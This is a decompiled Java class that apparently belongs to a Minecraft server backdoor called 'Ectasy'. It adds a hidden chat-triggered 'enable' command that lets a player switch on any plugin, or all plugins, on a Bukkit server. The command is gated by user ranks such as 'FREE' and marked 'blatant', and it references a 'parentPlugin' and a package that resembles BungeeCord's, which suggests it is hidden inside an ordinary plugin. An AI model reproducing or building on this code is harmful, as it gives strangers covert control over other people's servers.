package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;

@CommandInfo(
   name = "enable",
   description = "Enable a plugin",
   blatant = true,
   rank = Rank.FREE
)
public class EnablePluginCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length < 1) {
         ChatUtil.sendChat(var1.getPlayer(), "Please, use enable <plugin name> or enable *");
      } else {
         if (var3[0].equalsIgnoreCase("*")) {
            for(Plugin var7 : Bukkit.getServer().getPluginManager().getPlugins()) {
               if (!var7.getName().equals(Ectasy.parentPlugin.getDescription().getName())) {
                  Bukkit.getPluginManager().enablePlugin(var7);
               }
            }

            ChatUtil.sendChat(var1.getPlayer(), "Enabled all plugins on the server");
         } else if (Bukkit.getPluginManager().getPlugin(var3[0]) == null) {
            ChatUtil.sendChat(var1.getPlayer(), "The plugin does not exist. (Cap Sensitive)");
         } else if (!Bukkit.getPluginManager().getPlugin(var3[0]).isEnabled()) {
            Bukkit.getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin(var3[0]));
            ChatUtil.sendChat(var1.getPlayer(), var3[0] + " is now enabled.");
         } else {
            ChatUtil.sendChat(var1.getPlayer(), "The plugin is already enabled.");
         }
      }
   }

   public EnablePluginCommand() {
   }
}
